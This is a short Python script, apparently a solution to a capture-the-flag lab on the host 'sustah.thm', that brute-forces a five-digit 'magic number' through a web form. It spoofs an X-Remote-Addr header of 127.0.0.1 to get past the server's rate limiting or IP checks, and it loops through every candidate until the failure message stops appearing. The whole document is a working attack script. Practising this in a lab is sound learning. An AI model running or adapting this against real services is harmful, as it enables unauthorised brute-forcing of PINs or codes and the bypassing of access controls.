import requests
import sys

url = "http://sustah.thm:8085/"
header = {"X-Remote-Addr": "127.0.0.1"}
with requests.Session() as r:
    for number in range(10000,99999):
        data = {"number": number}
        out = r.post(url, headers=header, data=data)
        if ("Oh no! How unlucky." in out.text):
            print(number, end='\r')
        else:
            print(f"Success! magic number is: {number}")
            break
        